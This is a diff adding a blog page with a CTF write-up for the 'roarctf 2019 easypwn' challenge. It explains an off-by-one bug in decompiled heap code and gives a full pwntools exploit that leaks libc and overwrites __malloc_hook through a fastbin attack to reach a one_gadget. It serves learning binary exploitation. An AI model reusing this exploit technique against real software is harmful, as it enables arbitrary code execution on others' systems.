@@ -1,0 +1,1135 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon00.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这个题就是一直耿耿于怀的题，做了3天，还是看着别人exp才搞出来的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="roarctf 2019 easypwn">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;19&#x2F;roarctf-2019-easypwn&#x2F;index.html">
+<meta property="og:site_name" content="N0vice&#39;s Blog">
+<meta property="og:description" content="这个题就是一直耿耿于怀的题，做了3天，还是看着别人exp才搞出来的">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;19&#x2F;roarctf-2019-easypwn&#x2F;easypwn1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;19&#x2F;roarctf-2019-easypwn&#x2F;easypwn2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;19&#x2F;roarctf-2019-easypwn&#x2F;easypwn3.png">
+<meta property="article:published_time" content="2020-04-19T15:36:25.000Z">
+<meta property="article:modified_time" content="2020-04-20T13:27:03.134Z">
+<meta property="article:author" content="N0vice">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;19&#x2F;roarctf-2019-easypwn&#x2F;easypwn1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/19/roarctf-2019-easypwn/"/>
+
+
+
+
+
+  <title>roarctf 2019 easypwn | N0vice's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.1.0"></head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+<script src="/live2d-widget/autoload.js"></script>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">N0vice's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/19/roarctf-2019-easypwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="N0vice">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="N0vice's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">roarctf 2019 easypwn</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-19T23:36:25+08:00">
+                2020-04-19
+              </time>
+            
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这个题就是一直耿耿于怀的题，做了3天，还是看着别人exp才搞出来的<a id="more"></a><br>分析一下伪代码，函数已重命名  </p>
+<pre><code class="cpp">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>
+<span class="function"></span>{
+  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch]</span>
+  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span>
+
+  sub_AD0(a1, a2, a3);
+  <span class="keyword">while</span> ( <span class="number">1</span> )
+  {
+    menu();
+    v4 = get_number(v4);
+    <span class="keyword">switch</span> ( &amp;savedregs )
+    {
+      <span class="keyword">case</span> <span class="number">1u</span>:
+        add();
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">2u</span>:
+        <span class="built_in">puts</span>(<span class="string">"Tell me the secret about you!!"</span>);
+        edit();
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">3u</span>:
+        <span class="keyword">delete</span>();
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">4u</span>:
+        show();
+        <span class="keyword">break</span>;
+      <span class="keyword">case</span> <span class="number">5u</span>:
+        <span class="keyword">return</span> <span class="number">0L</span>L;
+      <span class="keyword">default</span>:
+        <span class="built_in">puts</span>(<span class="string">"Wrong try again!!"</span>);
+        <span class="keyword">break</span>;
+    }
+  }
+}</code></pre>
+<pre><code class="cpp">__<span class="function">int64 <span class="title">add</span><span class="params">()</span></span>
+<span class="function"></span>{
+  __int64 result; <span class="comment">// rax</span>
+  <span class="keyword">int</span> v1; <span class="comment">// ST0C_4</span>
+  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span>
+  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span>
+  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+8h] [rbp-18h]</span>
+  <span class="keyword">void</span> *v5; <span class="comment">// [rsp+10h] [rbp-10h]</span>
+
+  result = <span class="number">0L</span>L;
+  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )
+  {
+    result = *(&amp;unk_202040 + <span class="number">4</span> * i);
+    <span class="keyword">if</span> ( !result )
+    {
+      <span class="built_in">printf</span>(<span class="string">"size: "</span>);
+      v4 = get_number(v3);
+      <span class="keyword">if</span> ( v4 &gt; <span class="number">0</span> )
+      {
+        <span class="keyword">if</span> ( v4 &gt; <span class="number">4096</span> )
+          v4 = <span class="number">4096</span>;
+        v5 = <span class="built_in">calloc</span>(v4, <span class="number">1u</span>LL);
+        <span class="keyword">if</span> ( !v5 )
+          <span class="built_in">exit</span>(<span class="number">-1</span>);
+        *(&amp;unk_202040 + <span class="number">4</span> * i) = <span class="number">1</span>;
+        *(&amp;unk_202044 + <span class="number">4</span> * i) = v4;
+        qword_202048[<span class="number">2</span> * i] = v5;
+        v1 = qword_202048[<span class="number">2</span> * i] &amp; <span class="number">0xFFF</span>;
+        <span class="built_in">printf</span>(<span class="string">"the index of ticket is %d \n"</span>, i);
+      }
+      <span class="keyword">return</span> i;
+    }
+  }
+  <span class="keyword">return</span> result;
+}</code></pre>
+<pre><code class="C++">__<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span>
+  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span>
+  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span>
+  <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span>
+
+  <span class="built_in">printf</span>(<span class="string">"index: "</span>);
+  v2 = get_number(v1);
+  v3 = v2;
+  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )
+  {
+    v2 = *(&amp;unk_202040 + <span class="number">4</span> * v2);
+    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )
+    {
+      <span class="built_in">printf</span>(<span class="string">"size: "</span>);
+      v2 = get_number(<span class="number">1</span>);
+      v4 = check_size(*(&amp;unk_202044 + <span class="number">4</span> * v3), v2);
+      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )
+      {
+        <span class="built_in">printf</span>(<span class="string">"content: "</span>, v2);
+        v2 = get_content(qword_202048[<span class="number">2</span> * v3], v4);
+      }
+    }
+  }
+  <span class="keyword">return</span> v2;
+}</code></pre>
+<pre><code class="C++">__<span class="function">int64 <span class="title">delete</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">int</span> v0; <span class="comment">// eax</span>
+  <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span>
+  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span>
+  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span>
+
+  <span class="built_in">printf</span>(<span class="string">"index: "</span>);
+  v0 = get_number(v3);
+  v4 = v0;
+  v2 = v0;
+  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0L</span>L &amp;&amp; v0 &lt;= <span class="number">15L</span>L )
+  {
+    v4 = *(&amp;unk_202040 + <span class="number">4</span> * v0);
+    <span class="keyword">if</span> ( v4 == <span class="number">1</span> )
+    {
+      *(&amp;unk_202040 + <span class="number">4</span> * v0) = <span class="number">0</span>;
+      *(&amp;unk_202044 + <span class="number">4</span> * v0) = <span class="number">0</span>;
+      <span class="built_in">free</span>(qword_202048[<span class="number">2</span> * v0]);
+      qword_202048[<span class="number">2</span> * v2] = <span class="number">0L</span>L;
+    }
+  }
+  <span class="keyword">return</span> v4;
+}</code></pre>
+<pre><code class="cpp">__<span class="function">int64 <span class="title">show</span><span class="params">()</span></span>
+<span class="function"></span>{
+  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span>
+  __int64 v2; <span class="comment">// [rsp+0h] [rbp-10h]</span>
+
+  <span class="built_in">printf</span>(<span class="string">"index: "</span>);
+  LODWORD(v2) = get_number(v1);
+  HIDWORD(v2) = v2;
+  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )
+  {
+    LODWORD(v2) = *(&amp;unk_202040 + <span class="number">4</span> * v2);
+    <span class="keyword">if</span> ( v2 == <span class="number">1</span> )
+    {
+      <span class="built_in">printf</span>(<span class="string">"content: "</span>, v2);
+      LODWORD(v2) = puts_content(qword_202048[<span class="number">2</span> * SHIDWORD(v2)], *(&amp;unk_202044 + <span class="number">4</span> * SHIDWORD(v2)));
+    }
+  }
+  <span class="keyword">return</span> v2;
+}</code></pre>
+<p>delete函数，指针已置零，无UAF<br>最重要的是check_size函数  </p>
+<pre><code class="cpp">__int64 __<span class="function">fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span>
+<span class="function"></span>{
+  __int64 result; <span class="comment">// rax</span>
+
+  <span class="keyword">if</span> ( a1 &gt; a2 )
+    <span class="keyword">return</span> a2;
+  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )
+    LODWORD(result) = a1 + <span class="number">1</span>;
+  <span class="keyword">else</span>
+    LODWORD(result) = a1;
+  <span class="keyword">return</span> result;
+}</code></pre>
+<p>一开始我不知道这里是什么意思，看了半天才明白，这里是说，edit时输入的size如果比add输入的size大10的话，edit就会多读入一个字节，造成off by one漏洞<br>那这题就很明确了，利用off by one + fastbin attack打malloc_hook<br>还有一点需要注意的是，这题直接用onegadget没办法打，满足不了one_gadget需要满足的条件，所以需要用realloc函数来调整栈环境<br>思路：<br>①add 7个chunk，index从0-6<br>②利用off by one，通过edit chunk0，把chunk1的size改了，让chunk1包含chunk2，造成overlap<br>③free chunk1，然后再add回原size的chunk1，此时chunk2中会出现main_arena+88的地址，且chunk2处于inuse状态（原因未知），直接show，就能leak出libc_base<br>④edit chunk4，利用obo将chunk6包含进chunk5<br>⑤free chunk5、chunk6<br>⑥将chunk5 add回来，此时应该拥有了一块包含chunk6的chunk5<br>⑦edit chunk5，将malloc_hook-0x23写到chunk6的fd位<br>⑧free chunk6，此时fastbin中，对应的原chunk_size处的指针指向malloc_hook-0x23<br>⑨add 两块chunk，就能分配到一个地址为malloc_hook-0x23的chunk<br>⑩将malloc_hook改one_gadget，一把梭gg<br>exp：  </p>
+<pre><code class="python"><span class="comment">#!/usr/bin/env python</span>
+<span class="comment">#coding=utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span>*
+<span class="keyword">import</span> sys
+<span class="comment">#context.log_level = 'debug'</span>
+context.terminal = [<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>]
+binary = <span class="string">'./roarctf_2019_easy_pwn'</span> 
+local = <span class="number">1</span>
+<span class="keyword">if</span> local == <span class="number">1</span>:
+    p=process(binary)
+<span class="keyword">else</span>:
+    p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25768</span>)
+elf=ELF(binary)
+libc=elf.libc
+<span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span>
+    p.recvuntil(<span class="string">"choice: "</span>)
+    p.sendline(<span class="string">"1"</span>)
+    p.recvuntil(<span class="string">"size: "</span>)
+    p.sendline(str(size))
+<span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span>
+    p.recvuntil(<span class="string">"choice: "</span>)
+    p.sendline(<span class="string">"2"</span>)
+    p.recvuntil(<span class="string">"index: "</span>)
+    p.sendline(str(index))
+    p.recvuntil(<span class="string">"size: "</span>)
+    p.sendline(str(size))
+    p.recvuntil(<span class="string">"content: "</span>)
+    p.sendline(str(content))
+<span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">'choice: '</span>)
+    p.sendline(<span class="string">'3'</span>)
+    p.recvuntil(<span class="string">'index:'</span>)
+    p.sendline(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span>
+    p.recvuntil(<span class="string">"choice: "</span>)
+    p.sendline(<span class="string">"4"</span>)
+    p.recvuntil(<span class="string">"index: "</span>)
+    p.sendline(str(index))
+<span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span>
+    add(<span class="number">0x18</span>) <span class="comment"># 0</span>
+    add(<span class="number">0x68</span>) <span class="comment"># 1</span>
+    add(<span class="number">0x68</span>) <span class="comment"># 2</span>
+    add(<span class="number">0x68</span>) <span class="comment"># 3</span>
+    add(<span class="number">0x68</span>) <span class="comment"># 4</span>
+    add(<span class="number">0x68</span>) <span class="comment"># 5</span>
+    add(<span class="number">0x68</span>) <span class="comment"># 6</span>
+    payload = <span class="string">"a"</span>*<span class="number">0x18</span> + p8(<span class="number">0xe1</span>)
+    edit(<span class="number">0</span>,<span class="number">0x22</span>,payload)
+    free(<span class="number">1</span>)
+    add(<span class="number">0x68</span>) <span class="comment"># 1</span>
+
+    show(<span class="number">2</span>)
+    libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span>  <span class="comment"># leak libc_base</span>
+    malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]
+    realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]
+    one_gadget = libc_base + <span class="number">0x4526a</span>
+    log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))
+    log.success(<span class="string">"malloc_hook==&gt;"</span> + hex(malloc_hook))
+    log.success(<span class="string">"realloc==&gt;"</span> + hex(realloc))
+    log.success(<span class="string">"one_gadget==&gt;"</span> + hex(one_gadget))
+
+    payload = <span class="string">"a"</span>*<span class="number">0x68</span> + p8(<span class="number">0xe1</span>)
+    edit(<span class="number">4</span>,<span class="number">0x68</span>+<span class="number">10</span>,payload)
+    free(<span class="number">5</span>)
+    free(<span class="number">6</span>)
+    add(<span class="number">0xd0</span>) <span class="comment"># 5</span>
+    payload = <span class="string">"a"</span>*<span class="number">0x68</span> + p64(<span class="number">0x71</span>) + p64(malloc_hook<span class="number">-0x23</span>)
+    payload += <span class="string">"b"</span>*(<span class="number">0xd0</span>-len(payload))
+    edit(<span class="number">5</span>,<span class="number">0xd0</span>,payload)
+    free(<span class="number">6</span>)
+    add(<span class="number">0x68</span>) <span class="comment"># 6</span>
+    add(<span class="number">0x68</span>) <span class="comment"># 7</span>
+    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(one_gadget) + p64(realloc+<span class="number">13</span>)
+    payload = payload.ljust(<span class="number">0x68</span>,<span class="string">"\x00"</span>)
+    edit(<span class="number">7</span>,<span class="number">0x68</span>,payload)
+    add(<span class="number">0x10</span>)
+
+    p.interactive()
+exp()</code></pre>
+<p>问：不是距离malloc_hook-0x23吗，去掉chunk头，需要填充0x13，为什么填充0x13-8呢？<br>答：realloc_hook在malloc_hook上方，我们将onegadget写入了realloc_hook中，将realloc写入了malloc_hook中，这样调用malloc时就相当于调用了malloc_hook，就相当于调用了realloc，就相当于调用了realloc_hook，就相当于调用了one_gadget<br><img src="easypwn1.png" alt=""><br>问：一开始泄露地址时为什么free(1)之后又add(0x68)，main_arena+88就在chunk2中了？<br>答：add(0x68)好像实质上是malloc了chunk2回来，具体不是很清楚，只是不断调试发现正好是这样的，就show了<br>free掉1之后是这样的<br><img src="easypwn2.png" alt=""><br>add回来之后长这样<br><img src="easypwn3.png" alt=""><br>尝试性show了一下chunk2发现可以leak  </p>
+<p>本来想着这个题还要用什么realloc，有点麻烦，所以想打free_hook的，但是看了看，free_hook更麻烦，还要写0x7f什么的，理解不了，不大会<br>等学会了来打一下free_hook（挖坑待填）<br>参考链接：<br><a href="https://blog.csdn.net/weixin_44145820/article/details/104839805" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44145820/article/details/104839805</a><br><a href="https://nocbtm.github.io/2019/10/14/2019-RoarCTF-pwn-writeup" target="_blank" rel="noopener">https://nocbtm.github.io/2019/10/14/2019-RoarCTF-pwn-writeup</a><br><a href="https://binlep.github.io/2020/01/12/%E3%80%90WriteUp%E3%80%91RoarCTF%202019--Pwn%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://binlep.github.io/2020/01/12/%E3%80%90WriteUp%E3%80%91RoarCTF%202019--Pwn%E9%A2%98%E8%A7%A3/</a><br><a href="https://www.cnblogs.com/luoleqi/p/12380696.html" target="_blank" rel="noopener">https://www.cnblogs.com/luoleqi/p/12380696.html</a><br><a href="http://www.pwn4fun.com/pwn/buuctf-pwn-writeup-part2.html#roarctf2019easypwn" target="_blank" rel="noopener">http://www.pwn4fun.com/pwn/buuctf-pwn-writeup-part2.html#roarctf2019easypwn</a>  </p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的鼓励将支持我继续努力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="N0vice 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="N0vice 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    N0vice
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/2020/04/19/roarctf-2019-easypwn/" title="roarctf 2019 easypwn">http://yoursite.com/2020/04/19/roarctf-2019-easypwn/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/16/0ctf2017-babyheap/" rel="next" title="0ctf2017 babyheap">
+                <i class="fa fa-chevron-left"></i> 0ctf2017 babyheap
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/20/%F0%9F%91%B4%E4%BB%8A%E5%A4%A9%E5%BF%83%E6%83%85%E2%91%A7%E5%A4%A7%E5%A5%BD/" rel="prev" title="👴今天心情⑧大好">
+                👴今天心情⑧大好 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="N0vice" />
+            
+              <p class="site-author-name" itemprop="name">N0vice</p>
+              <p class="site-description motion-element" itemprop="description">从前我是瞎的，如今我看得见</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/N0vice21" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.zhihu.com/people/luo-yu-piao" target="_blank" title="知乎">
+                      
+                        <i class="fa fa-fw fa-zhihu"></i>知乎</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://spacey.top/" title="Elli0t" target="_blank">Elli0t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.ericdshen.com/" title="EDS" target="_blank">EDS</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://migraine-sudo.github.io" title="Migraine" target="_blank">Migraine</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shawroot.cc/" title="Root" target="_blank">Root</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.yuque.com/pi3ntn/azmee3" title="Lime" target="_blank">Lime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://mrbelieve128.github.io/" title="Mr.Believe" target="_blank">Mr.Believe</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://l0x1c.github.io/" title="L0x1c" target="_blank">L0x1c</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://binlep.top/" title="binlep" target="_blank">binlep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://1p0ch.cn/" title="1p0ch" target="_blank">1p0ch</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://retr0.vip/" title="Retr_0" target="_blank">Retr_0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.pwn4fun.com/" title="Railgun" target="_blank">Railgun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hackerpoet.com/" title="T4rn" target="_blank">T4rn</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
